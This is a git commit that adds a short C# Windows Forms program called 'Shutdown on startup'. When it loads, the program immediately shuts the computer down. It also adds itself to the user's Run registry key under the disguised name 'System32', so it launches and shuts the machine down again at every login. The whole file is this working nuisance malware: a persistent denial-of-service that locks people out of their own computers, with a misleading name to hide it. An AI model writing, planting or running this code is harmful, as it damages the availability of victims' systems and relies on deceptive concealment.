956444861c29bf8a3ba42c54df070e30909211e1
AMTitan <amtitan@icloud.com>
2020-12-15 10:02:36 -0500

    Shutdown on startup

---
+++ shutdown on startup/Form1.cs
@@ -0,0 +1,28 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using Microsoft.Win32;
+
+namespace shutdown_on_startup
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            System.Diagnostics.Process.Start("shutdown", "/s /t 0");
+            RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            reg.SetValue("System32", Application.ExecutablePath.ToString());
+        }
+    }
+}
